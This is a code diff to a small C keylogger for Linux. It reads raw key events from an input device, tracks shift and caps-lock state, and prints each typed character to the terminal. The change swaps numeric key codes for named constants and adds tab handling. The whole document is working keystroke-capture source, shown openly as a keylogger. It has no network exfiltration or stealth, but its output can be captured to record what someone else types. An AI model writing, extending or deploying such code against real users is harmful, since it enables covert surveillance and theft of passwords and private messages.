@@ -7,11 +7,18 @@
 #include<linux/kd.h>
 #include<sys/ioctl.h>
 #include<stdbool.h>
+
+#define MIN_KARG_COUNT 2
+#define ERROR -1
+#define CAPS_LOCK_FLAG_OFFSET 1
+
+#define USER_KEY_PRESS 1
+#define USER_KEY_RELEASE 0
 int main(int argc, char *argv[]){
 	
-	if(argc != 2){
+	if(argc != MIN_KARG_COUNT){
 		printf("usage: %s <event-name>\n",argv[0]);
-		exit(-1);
+		exit(ERROR);
 	}
 	printf("\t\t\t\t__________________________________\n\n");
 	printf("\t\t\t\tkeylogger active...\n");
@@ -21,7 +28,7 @@ int main(int argc, char *argv[]){
 	int fd;
 	if((fd = open(argv[1],O_RDONLY)) == -1){
 		perror("open");
-		exit(-1);
+		exit(ERROR);
 	}
 	printf("\t\t\t\tlog: active file descriptor: %d\n",fd);	
 	
@@ -45,12 +52,12 @@ int main(int argc, char *argv[]){
 	char arg;
 
 	//get CAPS_LOCK state
-	if(ioctl(fd,EVIOCGLED(sizeof(arg)),&arg) == -1){
+	if(ioctl(fd,EVIOCGLED(sizeof(arg)),&arg) == ERROR){
 		perror("EVIOCGLED");
 		close(fd);
 		exit(-1);
 	} else{
-		MODE_UPPERCASE = (arg >> LED_CAPSL) & 1;
+		MODE_UPPERCASE = (arg >> LED_CAPSL) & CAPS_LOCK_FLAG_OFFSET;
 	}
 	printf("\t\t\t\tlog: (flag)CAPS_LOCK_ENABLED:%d\n",MODE_UPPERCASE);
 	printf("\t\t\t\t__________________________________\n\n");
@@ -64,188 +71,195 @@ int main(int argc, char *argv[]){
 		int rd_bytes = read(fd,&ie,sizeof(ie));
 		
 		//detect left shift press
-		if(ie.type==0x01 && ie.code==42){
-			if(ie.value==1){
+		if(ie.type==EV_KEY && ie.code==KEY_LEFTSHIFT){
+			if(ie.value==USER_KEY_PRESS){
 				left_shift_down=true;
 				MODE_UPPERCASE=!MODE_UPPERCASE;
 			}
-			else if(ie.value==0){
+			else if(ie.value==USER_KEY_RELEASE){
 				left_shift_down=false;
 				MODE_UPPERCASE=!MODE_UPPERCASE;
 			}
 		}
 
 		//detect right shift press
-		if(ie.type==0x01 && ie.code==54){
-			if(ie.value==1){
+		if(ie.type==EV_KEY && ie.code==KEY_RIGHTSHIFT){
+			if(ie.value==USER_KEY_PRESS){
 				right_shift_down=true;
 				MODE_UPPERCASE=!MODE_UPPERCASE;
 			}
-			else if(ie.value==0){
+			else if(ie.value==USER_KEY_RELEASE){
 				right_shift_down=false;
 				MODE_UPPERCASE=!MODE_UPPERCASE;
 			}
 		}
 
-		if(ie.value==1){
+		if(left_shift_down || right_shift_down)
+			shift_down=true;
+		else
+			shift_down=false;
+
+		if(ie.value==USER_KEY_PRESS){
 			
 			//Numbers
-			if(ie.code==2)
+			if(ie.code==KEY_1)
 				printf(shift_down ? "!":"1");
-			if(ie.code==3)
+			if(ie.code==KEY_2)
 				printf(shift_down ? "@":"2");
-			if(ie.code==4)	
+			if(ie.code==KEY_3)	
 				printf(shift_down ? "#":"3");
-			if(ie.code==5)
+			if(ie.code==KEY_4)
 				printf(shift_down ? "$":"4");
-			if(ie.code==6)
+			if(ie.code==KEY_5)
 				printf(shift_down ? "%%":"5");
-			if(ie.code==7)
+			if(ie.code==KEY_6)
 				printf(shift_down ? "^" : "6");
-			if(ie.code==8)
+			if(ie.code==KEY_7)
 				printf(shift_down ? "&" : "7");
-			if(ie.code==9)
+			if(ie.code==KEY_8)
 				printf(shift_down ? "*" : "8");
-			if(ie.code==10)
+			if(ie.code==KEY_9)
 				printf(shift_down ? "(" : "9");
-			if(ie.code==11)
+			if(ie.code==KEY_0)
 				printf(shift_down ? ")" : "0");
-			if(ie.code==12)
+			if(ie.code==KEY_MINUS)
 				printf(shift_down ? "_" : "-");
-			if(ie.code==13)
+			if(ie.code==KEY_EQUAL)
 				printf(shift_down ? "+" : "=");
 		
 			//Alphabets
-			if(ie.code==16)
+			if(ie.code==KEY_Q)
 				printf(MODE_UPPERCASE ? "Q":"q");
-			if(ie.code==17)
+			if(ie.code==KEY_W)
 				printf(MODE_UPPERCASE ? "W":"w");
-			if(ie.code==18)
+			if(ie.code==KEY_E)
 				printf(MODE_UPPERCASE ? "E":"e");
-			if(ie.code==19)
+			if(ie.code==KEY_R)
 				printf(MODE_UPPERCASE ? "R":"r");
-			if(ie.code==20)
+			if(ie.code==KEY_T)
 				printf(MODE_UPPERCASE ? "T":"t");
-			if(ie.code==21)
+			if(ie.code==KEY_Y)
 				printf(MODE_UPPERCASE ? "Y":"y");
-			if(ie.code==22)
+			if(ie.code==KEY_U)
 				printf(MODE_UPPERCASE ? "U":"u");
-			if(ie.code==23)
+			if(ie.code==KEY_I)
 				printf(MODE_UPPERCASE ? "I":"i");
-			if(ie.code==24)
+			if(ie.code==KEY_O)
 				printf(MODE_UPPERCASE ? "O":"o");
-			if(ie.code==25)
+			if(ie.code==KEY_P)
 				printf(MODE_UPPERCASE ? "P":"p");
 
-			if(ie.code==30)
+			if(ie.code==KEY_A)
 				printf(MODE_UPPERCASE ? "A":"a");
-			if(ie.code==31)
+			if(ie.code==KEY_S)
 				printf(MODE_UPPERCASE ? "S":"s");
-			if(ie.code==32)
+			if(ie.code==KEY_D)
 				printf(MODE_UPPERCASE ? "D":"d");
-			if(ie.code==33)
+			if(ie.code==KEY_F)
 				printf(MODE_UPPERCASE ? "F":"f");
-			if(ie.code==34)
+			if(ie.code==KEY_G)
 				printf(MODE_UPPERCASE ? "G":"g");
-			if(ie.code==35)
+			if(ie.code==KEY_H)
 				printf(MODE_UPPERCASE ? "H":"h");
-			if(ie.code==36)
+			if(ie.code==KEY_J)
 				printf(MODE_UPPERCASE ? "J":"j");
-			if(ie.code==37)
+			if(ie.code==KEY_K)
 				printf(MODE_UPPERCASE ? "K":"k");
-			if(ie.code==38)
+			if(ie.code==KEY_L)
 				printf(MODE_UPPERCASE ? "L":"l");
 
-			if(ie.code==44)
+			if(ie.code==KEY_Z)
 				printf(MODE_UPPERCASE ? "Z":"z");
-			if(ie.code==45)
+			if(ie.code==KEY_X)
 				printf(MODE_UPPERCASE ? "X":"x");
-			if(ie.code==46)
+			if(ie.code==KEY_C)
 				printf(MODE_UPPERCASE ? "C":"c");
-			if(ie.code==47)
+			if(ie.code==KEY_V)
 				printf(MODE_UPPERCASE ? "V":"v");
-			if(ie.code==48)
+			if(ie.code==KEY_B)
 				printf(MODE_UPPERCASE ? "B":"b");
-			if(ie.code==49)
+			if(ie.code==KEY_N)
 				printf(MODE_UPPERCASE ? "N":"n");
-			if(ie.code==50)
+			if(ie.code==KEY_M)
 				printf(MODE_UPPERCASE ? "M":"m");
 			
 			//Special Characters
-			if(ie.code==26)
+			if(ie.code==KEY_LEFTBRACE)
 				printf(shift_down ? "{":"[");
-			if(ie.code==27)
+			if(ie.code==KEY_RIGHTBRACE)
 				printf(shift_down ? "}":"]");
-			if(ie.code==39)
+			if(ie.code==KEY_SEMICOLON)
 				printf(shift_down ? ":":";");
-			if(ie.code==40)
+			if(ie.code==KEY_APOSTROPHE)
 				printf(shift_down ? "\"" : "'");
-			if(ie.code==41)
+			if(ie.code==KEY_GRAVE)
 				printf(shift_down ? "~" : "`");
-			if(ie.code==43)
+			if(ie.code==KEY_BACKSLASH)
 				printf(shift_down ? "|" : "\\");
-			if(ie.code==51)
+			if(ie.code==KEY_COMMA)
 				printf(shift_down ? "<" : ",");
-			if(ie.code==52)
+			if(ie.code==KEY_DOT)
 				printf(shift_down ? ">" : ".");
-			if(ie.code==53)
+			if(ie.code==KEY_SLASH)
 				printf(shift_down ? "?" : "/");
 
 			// Control Keys
-			if(ie.code==42 || ie.code==54)
+			if(ie.code==KEY_LEFTSHIFT || ie.code==KEY_RIGHTSHIFT)
 				printf("⇧");
-			if(ie.code==57)
+			if(ie.code==KEY_SPACE)
 				printf(" ");
-			if(ie.code==14)
+			if(ie.code==KEY_BACKSPACE)
 				printf("⌫");
-			if(ie.code==28)
+			if(ie.code==KEY_ENTER)
 				printf("⏎");
-			if(ie.code==56 || ie.code==100)
+			if(ie.code==KEY_LEFTALT || ie.code==KEY_RIGHTALT)
 				printf("⎇");
-			if(ie.code==29 || ie.code==97)
+			if(ie.code==KEY_LEFTCTRL || ie.code==KEY_RIGHTCTRL)
 				printf("⎈");
-			
+			if(ie.code==KEY_TAB)
+				printf("↹");
+
 			//Numpad keys
-			if(ie.code==55)
+			if(ie.code==KEY_KPASTERISK)
 				printf("*");
-			if(ie.code==71)
+			if(ie.code==KEY_KP7)
 				printf("7");
-			if(ie.code==72)
+			if(ie.code==KEY_KP8)
 				printf("8");
-			if(ie.code==73)
+			if(ie.code==KEY_KP9)
 				printf("9");
-			if(ie.code==74)
+			if(ie.code==KEY_KPMINUS)
 				printf("-");
-			if(ie.code==75)
+			if(ie.code==KEY_KP4)
 				printf("4");
-			if(ie.code==76)
+			if(ie.code==KEY_KP5)
 				printf("5");
-			if(ie.code==77)
+			if(ie.code==KEY_KP6)
 				printf("6");
-			if(ie.code==78)
+			if(ie.code==KEY_KPPLUS)
 				printf("+");
-			if(ie.code==79)
+			if(ie.code==KEY_KP1)
 				printf("1");
-			if(ie.code==80)
+			if(ie.code==KEY_KP2)
 				printf("2");
-			if(ie.code==81)
+			if(ie.code==KEY_KP3)
 				printf("3");
-			if(ie.code==82)
+			if(ie.code==KEY_KP0)
 				printf("0");
-			if(ie.code==83)
+			if(ie.code==KEY_KPDOT)
 				printf(".");
 
 			//arrow keys
-			if(ie.code==103)
+			if(ie.code==KEY_UP)
 				printf("↑");
-			if(ie.code==105)
+			if(ie.code==KEY_LEFT)
 				printf("←");
-			if(ie.code==106)
+			if(ie.code==KEY_RIGHT)
 				printf("→");
-			if(ie.code==108)
+			if(ie.code==KEY_DOWN)
 				printf("↓");
 
-			if(ie.code==58){
+			if(ie.code==KEY_CAPSLOCK){
 				MODE_UPPERCASE = !MODE_UPPERCASE;
 				printf("⇪");
 			}
